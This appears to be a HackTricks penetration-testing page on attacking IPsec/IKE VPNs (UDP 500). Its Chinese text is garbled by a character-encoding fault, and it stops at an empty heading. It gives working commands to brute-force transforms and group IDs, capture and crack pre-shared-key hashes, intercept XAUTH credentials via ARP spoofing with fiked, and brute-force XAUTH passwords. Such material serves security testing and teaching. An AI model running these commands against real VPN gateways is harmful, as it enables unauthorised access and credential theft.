# 500/udp - IPsec/IKE VPN æ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸Š**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruder è·Ÿè¸ªä½ çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯æ ˆä¸­çš„é—®é¢˜ï¼Œä» API åˆ° Web åº”ç”¨å’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## åŸºæœ¬ä¿¡æ¯

IPsec æ˜¯ç”¨äºç½‘å…³åˆ°ç½‘å…³ï¼ˆLAN åˆ° LANï¼‰å’Œä¸»æœºåˆ°ç½‘å…³ï¼ˆè¿œç¨‹è®¿é—®ï¼‰ä¼ä¸š VPN è§£å†³æ–¹æ¡ˆçš„æœ€å¸¸ç”¨æŠ€æœ¯ã€‚

**IKE æ˜¯ ISAKMP çš„ä¸€ç§ç±»å‹**ï¼ˆInternet Security Association Key Management Protocolï¼‰å®ç°ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨äºèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢çš„æ¡†æ¶ã€‚IKE é€šè¿‡ä¸‰ä¸ªé˜¶æ®µçš„è¿‡ç¨‹åœ¨ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´å»ºç«‹å®‰å…¨å…³è”ï¼ˆSAï¼‰ï¼š

* **ç¬¬ 1 é˜¶æ®µï¼š**ä½¿ç”¨é¢„å…±äº«å¯†é’¥ï¼ˆPSKï¼‰æˆ–è¯ä¹¦åœ¨ 2 ä¸ªç«¯ç‚¹ä¹‹é—´å»ºç«‹å®‰å…¨é€šé“ã€‚å®ƒå¯ä»¥ä½¿ç”¨ä¸»æ¨¡å¼ï¼ˆ3 å¯¹æ¶ˆæ¯ï¼‰æˆ–**ä¸»åŠ¨æ¨¡å¼**ã€‚
* **ç¬¬ 1.5 é˜¶æ®µï¼š**è¿™æ˜¯å¯é€‰çš„ï¼Œç§°ä¸ºæ‰©å±•è®¤è¯é˜¶æ®µï¼Œç”¨äºå¯¹å°è¯•è¿æ¥çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆç”¨æˆ·+å¯†ç ï¼‰ã€‚
* **ç¬¬ 2 é˜¶æ®µï¼š**ä½¿ç”¨ ESP å’Œ AH åå•†æ•°æ®å®‰å…¨çš„å‚æ•°ã€‚å®ƒå¯ä»¥ä½¿ç”¨ä¸ç¬¬ 1 é˜¶æ®µä¸åŒçš„ç®—æ³•ï¼ˆå®Œå…¨å‰å‘ä¿å¯†ï¼ˆPFSï¼‰ï¼‰ã€‚

**é»˜è®¤ç«¯å£ï¼š**500/udp

## ä½¿ç”¨ nmap å‘ç°æœåŠ¡
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **å¯»æ‰¾æœ‰æ•ˆçš„è½¬æ¢**

IPSecé…ç½®åªèƒ½å‡†å¤‡æ¥å—ä¸€ä¸ªæˆ–å‡ ä¸ªè½¬æ¢ã€‚ä¸€ä¸ªè½¬æ¢æ˜¯ä¸€ç»„å€¼çš„ç»„åˆã€‚**æ¯ä¸ªè½¬æ¢**åŒ…å«ä¸€äº›å±æ€§ï¼Œå¦‚DESæˆ–3DESä½œä¸º**åŠ å¯†ç®—æ³•**ï¼ŒSHAæˆ–MD5ä½œä¸º**å®Œæ•´æ€§ç®—æ³•**ï¼Œé¢„å…±äº«å¯†é’¥ä½œä¸º**èº«ä»½éªŒè¯ç±»å‹**ï¼ŒDiffie-Hellman 1æˆ–2ä½œä¸ºå¯†é’¥**åˆ†å‘ç®—æ³•**ï¼Œä»¥åŠ28800ç§’ä½œä¸º**ç”Ÿå‘½å‘¨æœŸ**ã€‚

å› æ­¤ï¼Œä½ é¦–å…ˆè¦åšçš„æ˜¯**æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„è½¬æ¢**ï¼Œè¿™æ ·æœåŠ¡å™¨æ‰ä¼šä¸ä½ é€šä¿¡ã€‚ä¸ºæ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨å·¥å…·**ike-scan**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œike-scanåœ¨ä¸»æ¨¡å¼ä¸‹å·¥ä½œï¼Œå¹¶å‘ç½‘å…³å‘é€ä¸€ä¸ªå¸¦æœ‰ISAKMPå¤´å’Œä¸€ä¸ªåŒ…å«**å…«ä¸ªè½¬æ¢**çš„æè®®çš„æ•°æ®åŒ…ã€‚

æ ¹æ®å“åº”ï¼Œä½ å¯ä»¥è·å–æœ‰å…³ç»ˆç«¯çš„ä¸€äº›ä¿¡æ¯ï¼š
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
æ­£å¦‚æ‚¨åœ¨ä¸Šä¸€æ¡å›å¤ä¸­æ‰€çœ‹åˆ°çš„ï¼Œæœ‰ä¸€ä¸ªåä¸º**AUTH**çš„å­—æ®µï¼Œå…¶å€¼ä¸º**PSK**ã€‚è¿™æ„å‘³ç€VPNæ˜¯ä½¿ç”¨é¢„å…±äº«å¯†é’¥è¿›è¡Œé…ç½®çš„ï¼ˆå¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œè¿™éå¸¸å¥½ï¼‰ã€‚
**æœ€åä¸€è¡Œçš„å€¼ä¹Ÿéå¸¸é‡è¦ï¼š**

* _è¿”å›0ä¸ªæ¡æ‰‹ï¼›è¿”å›0ä¸ªé€šçŸ¥ï¼š_ è¿™æ„å‘³ç€ç›®æ ‡ä¸æ˜¯ä¸€ä¸ªIPsecç½‘å…³ã€‚
* _**è¿”å›1ä¸ªæ¡æ‰‹ï¼›è¿”å›0ä¸ªé€šçŸ¥ï¼š**_ è¿™æ„å‘³ç€ç›®æ ‡å·²é…ç½®ä¸ºIPsecï¼Œå¹¶æ„¿æ„æ‰§è¡ŒIKEåå•†ï¼Œå¹¶ä¸”æ‚¨æå‡ºçš„ä¸€ä¸ªæˆ–å¤šä¸ªå˜æ¢æ˜¯å¯æ¥å—çš„ï¼ˆè¾“å‡ºä¸­å°†æ˜¾ç¤ºä¸€ä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼‰ã€‚
* _è¿”å›0ä¸ªæ¡æ‰‹ï¼›è¿”å›1ä¸ªé€šçŸ¥ï¼š_ å½“**æ²¡æœ‰ä¸€ä¸ªå˜æ¢æ˜¯å¯æ¥å—çš„**æ—¶ï¼ŒVPNç½‘å…³ä¼šå“åº”ä¸€ä¸ªé€šçŸ¥æ¶ˆæ¯ï¼ˆå°½ç®¡ä¸€äº›ç½‘å…³ä¸ä¼šè¿™æ ·åšï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº”å°è¯•è¿›ä¸€æ­¥åˆ†æå’Œä¿®æ”¹æè®®ï¼‰ã€‚

å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼Œä½†å¦‚æœæ‚¨å¤„äºç¬¬ä¸‰ç§æƒ…å†µï¼Œåˆ™éœ€è¦**ç¨å¾®è¿›è¡Œæš´åŠ›ç ´è§£ä»¥æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼š**

é¦–å…ˆï¼Œæ‚¨éœ€è¦åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„å˜æ¢ï¼š
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
ç„¶åä½¿ç”¨ike-scanå¯¹æ¯ä¸ªè¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿™å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
å¦‚æœæš´åŠ›ç ´è§£æ²¡æœ‰æˆåŠŸï¼Œå¯èƒ½æœåŠ¡å™¨å³ä½¿å¯¹æœ‰æ•ˆçš„è½¬æ¢ä¹Ÿæ²¡æœ‰è¿›è¡Œæ¡æ‰‹å“åº”ã€‚é‚£ä¹ˆï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨ä¾µç•¥æ¨¡å¼è¿›è¡Œç›¸åŒçš„æš´åŠ›ç ´è§£ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
å¸Œæœ›**æœ‰æ•ˆçš„è½¬æ¢è¢«å›æ˜¾**ã€‚\
æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py)è¿›è¡Œ**ç›¸åŒçš„æ”»å‡»**ã€‚\
æ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨[**ikeforce**](https://github.com/SpiderLabs/ikeforce)æ¥æš´åŠ›ç ´è§£è½¬æ¢ï¼š
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

åœ¨**DH Group: 14 = 2048-bit MODP**å’Œ**15 = 3072-bit**ä¸­\
**2 = HMAC-SHA = SHA1ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼‰ã€‚--transæ ¼å¼ä¸º$Encï¼Œ$Hashï¼Œ$Authï¼Œ$DH**

Ciscoå»ºè®®ç‰¹åˆ«é¿å…ä½¿ç”¨DHç»„1å’Œ2ã€‚è®ºæ–‡çš„ä½œè€…æè¿°äº†å¦‚ä½•é€šè¿‡ç¦»æ•£å¯¹æ•°é¢„è®¡ç®—æ¥è§£å¯†ä½¿ç”¨å¼±ç»„åå•†çš„IPsecä¼šè¯ï¼Œè¿™å¾ˆå¯èƒ½æ˜¯å›½å®¶å¯ä»¥åšåˆ°çš„ã€‚é€šè¿‡å®æ—¶è§£å¯†ä½¿ç”¨å¼±ç»„ï¼ˆ1,024ä½æˆ–æ›´å°ï¼‰çš„ä»»ä½•ä¼šè¯ï¼Œæ•°äº¿ç¾å…ƒçš„é¢„è®¡ç®—æˆæœ¬å¾—åˆ°äº†æ‘Šé”€ã€‚

### æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«

ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ike-scanå°è¯•**å‘ç°è®¾å¤‡çš„ä¾›åº”å•†**ã€‚è¯¥å·¥å…·å‘é€ä¸€ä¸ªåˆå§‹æè®®å¹¶åœæ­¢é‡æ”¾ã€‚ç„¶åï¼Œå®ƒå°†**åˆ†æ**ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ¶ˆæ¯ä¸åŒ¹é…çš„å“åº”æ¨¡å¼ä¹‹é—´çš„**æ—¶é—´å·®å¼‚**ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥æˆåŠŸè¯†åˆ«VPNç½‘å…³ä¾›åº”å•†ã€‚æ­¤å¤–ï¼Œä¸€äº›VPNæœåŠ¡å™¨å°†ä½¿ç”¨å¸¦æœ‰IKEçš„å¯é€‰**ä¾›åº”å•†IDï¼ˆVIDï¼‰è´Ÿè½½**ã€‚

**å¦‚æœéœ€è¦ï¼ŒæŒ‡å®šæœ‰æ•ˆçš„è½¬æ¢**ï¼ˆä½¿ç”¨--transï¼‰

å¦‚æœIKEå‘ç°ä¾›åº”å•†æ˜¯è°ï¼Œå®ƒå°†æ‰“å°å‡ºæ¥ï¼š
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
è¿™ä¹Ÿå¯ä»¥ä½¿ç”¨nmapè„šæœ¬_**ike-version**_æ¥å®ç°ã€‚

## æŸ¥æ‰¾æ­£ç¡®çš„IDï¼ˆç»„åï¼‰

ä¸ºäº†èƒ½å¤Ÿæ•è·å“ˆå¸Œå€¼ï¼Œæ‚¨éœ€è¦ä¸€ä¸ªæ”¯æŒä¸»åŠ¨æ¨¡å¼å’Œæ­£ç¡®IDï¼ˆç»„åï¼‰çš„æœ‰æ•ˆè½¬æ¢ã€‚æ‚¨å¯èƒ½ä¸çŸ¥é“æœ‰æ•ˆçš„ç»„åï¼Œå› æ­¤æ‚¨éœ€è¦è¿›è¡Œæš´åŠ›ç ´è§£ã€‚\
ä¸ºæ­¤ï¼Œæˆ‘å»ºè®®æ‚¨ä½¿ç”¨2ç§æ–¹æ³•ï¼š

### ä½¿ç”¨ike-scanè¿›è¡ŒIDæš´åŠ›ç ´è§£

é¦–å…ˆï¼Œå°è¯•ä½¿ç”¨è™šå‡çš„IDå‘å‡ºè¯·æ±‚ï¼Œå°è¯•æ”¶é›†å“ˆå¸Œå€¼ï¼ˆ"-P"ï¼‰ï¼š
```bash
ike-scan -P -M -A -n fakeID <IP>
```
å¦‚æœ**æ²¡æœ‰è¿”å›å“ˆå¸Œå€¼**ï¼Œé‚£ä¹ˆå¯èƒ½è¿™ç§æš´åŠ›ç ´è§£æ–¹æ³•ä¼šèµ·ä½œç”¨ã€‚**å¦‚æœè¿”å›äº†æŸä¸ªå“ˆå¸Œå€¼ï¼Œè¿™æ„å‘³ç€å°†è¿”å›ä¸€ä¸ªä¼ªé€ çš„å“ˆå¸Œå€¼ç”¨äºä¼ªé€ çš„IDï¼Œå› æ­¤è¿™ç§æ–¹æ³•ä¸å¯é **æ¥æš´åŠ›ç ´è§£IDã€‚ä¾‹å¦‚ï¼Œå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªä¼ªé€ çš„å“ˆå¸Œå€¼ï¼ˆåœ¨ç°ä»£ç‰ˆæœ¬ä¸­ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼‰ï¼š

![](<../.gitbook/assets/image (110).png>)

ä½†æ˜¯ï¼Œå¦‚æœå¦‚æˆ‘æ‰€è¯´ï¼Œæ²¡æœ‰è¿”å›å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆä½ åº”è¯¥å°è¯•ä½¿ç”¨ike-scanæ¥æš´åŠ›ç ´è§£å¸¸è§çš„ç»„åã€‚

è¿™ä¸ªè„šæœ¬**å°†å°è¯•æš´åŠ›ç ´è§£å¯èƒ½çš„ID**ï¼Œå¹¶è¿”å›è¿”å›æœ‰æ•ˆæ¡æ‰‹çš„IDï¼ˆè¿™å°†æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç»„åï¼‰ã€‚

å¦‚æœä½ å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·åœ¨ike-scanå‘½ä»¤ä¸­æ·»åŠ å®ƒã€‚å¦‚æœä½ å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œè¯·éšæ„æ·»åŠ ä¸€ä¸ªæ–°çš„å¾ªç¯æ¥å°è¯•å®ƒä»¬ï¼ˆä½ åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œä¸ºæ­¢ï¼‰ã€‚

ä½ å¯ä»¥ä½¿ç”¨[ikeforceçš„å­—å…¸](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic)æˆ–[seclistsä¸­çš„å­—å…¸](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt)æ¥æš´åŠ›ç ´è§£å¸¸è§çš„ç»„åï¼š
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
æˆ–è€…ä½¿ç”¨è¿™ä¸ªå­—å…¸ï¼ˆæ˜¯ä¸¤ä¸ªå­—å…¸çš„ç»„åˆï¼Œæ²¡æœ‰é‡å¤çš„å†…å®¹ï¼‰ï¼š

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### ä½¿ç”¨Ikerè¿›è¡ŒIDæš´åŠ›ç ´è§£

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ä¹Ÿä½¿ç”¨ **ike-scan** æ¥æš´åŠ›ç ´è§£å¯èƒ½çš„ç»„åã€‚å®ƒéµå¾ªè‡ªå·±çš„æ–¹æ³•ï¼Œæ ¹æ®ike-scançš„è¾“å‡ºæ¥æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„IDã€‚

### ä½¿ç”¨ikeforceè¿›è¡ŒIDæš´åŠ›ç ´è§£

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥æš´åŠ›ç ´è§£IDçš„å·¥å…·ã€‚è¯¥å·¥å…·å°†å°è¯•åˆ©ç”¨ä¸åŒçš„æ¼æ´æ¥åŒºåˆ†æœ‰æ•ˆIDå’Œéæœ‰æ•ˆIDï¼ˆå¯èƒ½ä¼šæœ‰è¯¯æŠ¥å’Œè¯¯åˆ¤ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘æ›´å–œæ¬¢ä½¿ç”¨ike-scanæ–¹æ³•ï¼‰ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œikeforceä¼šåœ¨å¼€å§‹æ—¶å‘é€ä¸€äº›éšæœºçš„IDæ¥æ£€æŸ¥æœåŠ¡å™¨çš„è¡Œä¸ºï¼Œå¹¶ç¡®å®šè¦ä½¿ç”¨çš„ç­–ç•¥ã€‚

* ç¬¬ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡æœç´¢Ciscoç³»ç»Ÿçš„Dead Peer Detection DPDä¿¡æ¯ï¼ˆåªæœ‰åœ¨ç»„åæ­£ç¡®æ—¶æœåŠ¡å™¨æ‰ä¼šå›å¤è¯¥ä¿¡æ¯ï¼‰æ¥æš´åŠ›ç ´è§£ç»„åã€‚
* ç¬¬äºŒç§å¯ç”¨çš„æ–¹æ³•æ˜¯æ£€æŸ¥æ¯æ¬¡å°è¯•å‘é€çš„å“åº”æ•°é‡ï¼Œå› ä¸ºæœ‰æ—¶åœ¨ä½¿ç”¨æ­£ç¡®çš„IDæ—¶ä¼šå‘é€æ›´å¤šçš„æ•°æ®åŒ…ã€‚
* ç¬¬ä¸‰ç§æ–¹æ³•æ˜¯åœ¨å¯¹ä¸æ­£ç¡®çš„IDè¿›è¡Œå“åº”æ—¶æœç´¢"INVALID-ID-INFORMATION"ã€‚
* æœ€åï¼Œå¦‚æœæœåŠ¡å™¨å¯¹æ£€æŸ¥æ²¡æœ‰ä»»ä½•å›å¤ï¼Œikeforceå°†å°è¯•æš´åŠ›ç ´è§£æœåŠ¡å™¨ï¼Œå¹¶æ£€æŸ¥å½“å‘é€æ­£ç¡®çš„IDæ—¶æœåŠ¡å™¨æ˜¯å¦ä¼šå›å¤ä¸€äº›æ•°æ®åŒ…ã€‚\
æ˜¾ç„¶ï¼Œæš´åŠ›ç ´è§£IDçš„ç›®æ ‡æ˜¯åœ¨è·å¾—æœ‰æ•ˆçš„IDåè·å–PSKã€‚ç„¶åï¼Œä½¿ç”¨IDå’ŒPSKå°†éœ€è¦æš´åŠ›ç ´è§£XAUTHï¼ˆå¦‚æœå¯ç”¨ï¼‰ã€‚

å¦‚æœæ‚¨å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ°ikeforceå‘½ä»¤ä¸­ã€‚å¦‚æœæ‚¨å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œè¯·éšæ„æ·»åŠ ä¸€ä¸ªæ–°çš„å¾ªç¯æ¥å°è¯•å®ƒä»¬ï¼ˆæ‚¨åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œä¸ºæ­¢ï¼‰ã€‚
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### å—…æ¢ID

é€šè¿‡å—…æ¢VPNå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œä¹Ÿå¯ä»¥è·å–æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå› ä¸ºç¬¬ä¸€ä¸ªæ¿€è¿›æ¨¡å¼æ•°æ®åŒ…ä¸­åŒ…å«çš„å®¢æˆ·ç«¯IDæ˜¯æ˜æ–‡å‘é€çš„ï¼ˆæ¥è‡ªä¹¦ç±ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œã€‹ï¼‰ã€‚

![](<../.gitbook/assets/image (111).png>)

## æ•è·å’Œç ´è§£å“ˆå¸Œå€¼

æœ€åï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº†ä¸€ä¸ª**æœ‰æ•ˆçš„è½¬æ¢**å’Œ**ç»„å**ï¼Œå¹¶ä¸”**å…è®¸æ¿€è¿›æ¨¡å¼**ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥éå¸¸å®¹æ˜“åœ°è·å–å¯ç ´è§£çš„å“ˆå¸Œå€¼ï¼š
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
å“ˆå¸Œå€¼å°†ä¿å­˜åœ¨ _hash.txt_ æ–‡ä»¶ä¸­ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ **psk-crack**ã€**john**ï¼ˆä½¿ç”¨ [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)ï¼‰å’Œ **hashcat** æ¥ **ç ´è§£**è¯¥å“ˆå¸Œå€¼ï¼š
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

å¤§å¤šæ•°å®ç°ä½¿ç”¨**é¢„å…±äº«å¯†é’¥çš„ä¸»åŠ¨æ¨¡å¼IKEè¿›è¡Œç»„è®¤è¯**ï¼Œå¹¶ä½¿ç”¨**XAUTHæä¾›é¢å¤–çš„ç”¨æˆ·è®¤è¯**ï¼ˆé€šè¿‡Microsoft Active Directoryã€RADIUSæˆ–ç±»ä¼¼æ–¹å¼ï¼‰ã€‚åœ¨**IKEv2**ä¸­ï¼Œ**EAPæ›¿ä»£XAUTH**ç”¨äºè®¤è¯ç”¨æˆ·ã€‚

### æœ¬åœ°ç½‘ç»œä¸­é—´äººæ”»å‡»ä»¥æ•è·å‡­æ®

å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨_fiked_æ•è·ç™»å½•æ•°æ®ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦å­˜åœ¨é»˜è®¤ç”¨æˆ·åï¼ˆæ‚¨éœ€è¦å°†IKEæµé‡é‡å®šå‘åˆ°`fiked`ä»¥è¿›è¡Œå—…æ¢ï¼Œå¯ä»¥å€ŸåŠ©ARPæ¬ºéª—æ¥å®Œæˆï¼Œ[æ›´å¤šä¿¡æ¯](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)ï¼‰ã€‚Fikedå°†å……å½“VPNç»ˆç«¯ç‚¹ï¼Œå¹¶æ•è·XAuthå‡­æ®ï¼š
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
æ­¤å¤–ï¼Œä½¿ç”¨IPSecå°è¯•è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå¹¶é˜»æ­¢æ‰€æœ‰æµé‡åˆ°ç«¯å£500ï¼Œå¦‚æœæ— æ³•å»ºç«‹IPSecéš§é“ï¼Œå¯èƒ½ä¼šä»¥æ˜æ–‡å½¢å¼å‘é€æµé‡ã€‚

### ä½¿ç”¨ikeforceæš´åŠ›ç ´è§£XAUTHç”¨æˆ·åå’Œå¯†ç 

è¦æš´åŠ›ç ´è§£**XAUTH**ï¼ˆå½“æ‚¨çŸ¥é“æœ‰æ•ˆçš„ç»„å**id**å’Œ**psk**æ—¶ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç”¨æˆ·åæˆ–ç”¨æˆ·ååˆ—è¡¨ä»¥åŠå¯†ç åˆ—è¡¨ï¼š
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
è¿™æ ·ï¼Œikeforceå°†å°è¯•ä½¿ç”¨æ¯ä¸ªç”¨æˆ·å:å¯†ç ç»„åˆè¿›è¡Œè¿æ¥ã€‚

å¦‚æœæ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰æ•ˆçš„è½¬æ¢æ–¹å¼ï¼Œå°±åƒä¹‹å‰çš„æ­¥éª¤ä¸€æ ·ä½¿ç”¨å®ƒä»¬ã€‚

## ä½¿ç”¨IPSEC VPNè¿›è¡Œèº«ä»½éªŒè¯

